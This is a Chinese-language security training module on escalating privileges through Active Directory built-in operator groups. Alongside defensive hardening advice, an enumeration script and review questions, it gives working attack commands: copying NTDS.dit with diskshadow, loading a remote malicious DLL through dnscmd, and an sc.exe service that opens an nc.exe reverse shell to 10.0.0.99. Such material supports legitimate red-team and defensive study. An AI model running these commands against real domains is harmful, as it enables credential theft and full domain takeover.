# R08.3 目錄群組成員資格狀態驗證與特權濫用 (Directory Group-Membership State Validation)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

**目錄群組成員資格狀態驗證與特權濫用 (Privileged Group Abuse)** 的核心在於**發掘除「Domain Admins」外、常被企業防禦者忽視的「次級特權操作員群組 (Built-in Operator Groups)」**。Active Directory 在架構設計中為管理維護預留了眾多高權限角色（如 Backup Operators、DnsAdmins、Server Operators、Account Operators）。只要攻擊者獲取任一成員資格，即可利用其預設綁定之作業系統特權 (User Rights Assignment) 或服務配置權限，於數步之內直接晉升為網域控制站最高特權。

```
[攻擊者攻陷帳號: user_backup] ── 發現其屬於 [Backup Operators] 內建群組
                                        │
                                        ▼ 繼承 SeBackupPrivilege 與 SeRestorePrivilege
[繞過任意檔案 DACL 存取控制] ──────────► 具備讀取系統上任意檔案之原始特權
                                        │
                                        ▼ 透過 Diskshadow / Volume Shadow Copy (VSS)
[複製網域核心 NTDS.dit 與 SYSTEM] ─────► 導出 ntds.dit 與 SYSTEM Registry Hive
                                        │
                                        ▼ 離線提取 Krbtgt 金鑰或 Administrator Hash
[全網域最高特權掌控] ──────────────────► 實現全域身分接管！
```

## 🔬 第一動：內建特權群組能力與提權路徑矩陣 (Mechanics & Privilege Capabilities)

### 1. 核心內建操作員群組能力剖析

| 特權群組名稱 | 著名 Well-Known SID | 預設危險特權 / 權限 | 經典攻擊提權路徑 |
| :--- | :--- | :--- | :--- |
| **Backup Operators** | `S-1-5-32-551` | `SeBackupPrivilege`, `SeRestorePrivilege` | 讀取任意檔案：直接拷貝 `NTDS.dit` 與 `SYSTEM` 註冊表登入檔 |
| **DnsAdmins** | 網域動態分配 SID | 具備配置 DNS 伺服器之管理權 | 註冊惡意外掛 DLL (`ServerLevelPluginDll`) 於 DNS 服務 (SYSTEM) 執行 |
| **Server Operators** | `S-1-5-32-554` | 具備本機登入 DC 與建立服務之權限 | 在網域控制站上建立以 `LocalSystem` 運行的惡意 Windows 服務 |
| **Account Operators**| `S-1-5-32-548` | 具備建立/修改大部分使用者與群組之權限 | 重設除 Protected Users 以外的帳號密碼並橫向移動 |
| **Print Operators** | `S-1-5-32-555` | `SeLoadDriverPrivilege` (載入驅動程式) | 載入具備已漏洞之簽章驅動程式 (BYOVD) 取得核心權限 |

### 1. 核心特權群組提權指令速查表

```bash
# 1. Backup Operators 提權：利用 DiskShadow 備份 NTDS.dit
diskshadow /s c:\temp\shadow.txt
# shadow.txt 內容包含:
# set context persistent nowriters
# add volume c: alias shadowcopy
# create
# expose %shadowcopy% z:
# copy z:\windows\ntds\ntds.dit c:\temp\ntds.dit
# delete shadows all

# 2. DnsAdmins 提權：透過 dnscmd 注入外掛 DLL (以 SYSTEM 權限在 DC 執行)
dnscmd.exe dc01.corp.internal /config /serverlevelplugindll \\10.0.0.99\share\evil_dns.dll
sc.exe \\dc01.corp.internal stop dns
sc.exe \\dc01.corp.internal start dns

# 3. Server Operators 提權：直接於 DC 建立惡意反向服務
sc.exe \\dc01.corp.internal create PrivEscSvc binpath= "c:\temp\nc.exe 10.0.0.99 4444 -e cmd.exe"
sc.exe \\dc01.corp.internal start PrivEscSvc
```

## 🛡️ 第五動：工程級防禦基線 (Hardening Baselines)

1. **淨空內建操作員群組 (Zero-Member Baseline)**：
   - 除非有即時且審核過的維護需求，否則 `Backup Operators`、`Server Operators`、`DnsAdmins`、`Print Operators` **成員數量應嚴格保持為零**。
2. **禁止特權群組帳號具備互動式登入權限**：
   - 透過群組原則封閉操作員帳號於非專屬跳板機之「本機登入 (Allow log on locally)」與「遠端桌面登入」權利。
3. **AdminSDHolder 保護鏈路定期校驗**：
   - 確保核心特權群組的 DACL 繼承被強制中斷，防止權限繼承污染。

## 🧪 實戰演練環境搭建 (Environment & Lab Setup)

### 1. 極簡特權群組枚舉與權限驗證腳本 (PowerShell, 20 行)
```powershell
# Check-OperatorGroups.ps1
$TargetGroups = @("Backup Operators", "DnsAdmins", "Server Operators", "Account Operators", "Print Operators")
$CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
$UserGroups = $CurrentUser.Groups | ForEach-Object { $_.Translate([System.Security.Principal.NTAccount]).Value }

Write-Host "[*] 當前執行身分: $($CurrentUser.Name)"
foreach ($g in $TargetGroups) {
    $match = $UserGroups | Where-Object { $_ -like "*$g" }
    if ($match) {
        Write-Host "[!] 命中高危操作員特權群組: $match (具備潛在 DC 接管能力！)" -ForegroundColor Red
    } else {
        Write-Host "[-] 未加入: $g" -ForegroundColor Green
    }
}
```

### 2. 三步作戰驗證流程
```bash
# 步驟 1: 以測試帳號登入並執行檢查腳本
powershell -ep bypass -File Check-OperatorGroups.ps1
# 驗證輸出：提示當前身分所命中之次級特權群組

# 步驟 2: 模擬提權驗證（若屬於 DnsAdmins，查詢當前 DNS 伺服器配置）
dnscmd /info
# 驗證輸出：顯示完整 DNS 伺服器版本與運作狀態，證實具備 RPC 管理權限

# 步驟 3: 驗證工程加固（自網域群組中移除該測試帳號）
# 驗證輸出：再度執行腳本確認所有操作員群組均未命中，提權鏈路消除
```

## 🎯 作戰驗收檢查點 (Operational Checkpoints)

- [ ] **Q1：為何即使未加入 Domain Admins，僅加入 Backup Operators 就能達成等同網域最高特權？**
  - **戰術思維**：因其具備 `SeBackupPrivilege` 特權，此特權在作業系統核心層面享有「跳過所有物件之 DACL 讀取檢查」之特權，攻擊者可藉此直接讀取儲存全網域密碼雜湊的核心資料庫 `C:\Windows\NTDS\ntds.dit`。
- [ ] **Q2：DnsAdmins 提權時，注入的 DLL 是以何種身分在網域控制站上執行？**
  - **戰術思維**：Windows DNS 伺服器服務預設是以本機最高特權 **`NT AUTHORITY\SYSTEM`** 帳號啟動並運行，因此載入惡意外掛 DLL 即代表在 DC 上以 SYSTEM 權限執行任意程式碼。
- [ ] **Q3：在利用 Account Operators 進行橫向移動時，其權限受何種 Active Directory 機制約束？**
  - **戰術思維**：受 **AdminSDHolder** 保護。Account Operators 無法重設或修改屬於「受保護群組 (Protected Groups)」（例如 Domain Admins、Enterprise Admins）成員的密碼與屬性，僅能操縱非保護帳號。
- [ ] **Q4：Print Operators 群組的 `SeLoadDriverPrivilege` 特權如何轉化為核心特權？**
  - **戰術思維**：攻擊者可利用「自帶脆弱驅動程式 (BYOVD, Bring Your Own Vulnerable Driver)」技術，合法載入具備已知漏洞之簽章驅動，進而在 Ring-0 核心層關閉 EDR 監控或竊取系統 Token。
- [ ] **Q5：藍隊為何應在 SIEM 中建立針對 `ServerLevelPluginDll` 鍵值修改的即時警報？**
  - **戰術思維**：在正規生產環境中，微軟 DNS 伺服器極少需要載入第三方外掛 DLL；此註冊表鍵值一旦被創建或賦值，幾乎 100% 代表有紅隊正在實施 DnsAdmins 提權攻擊。
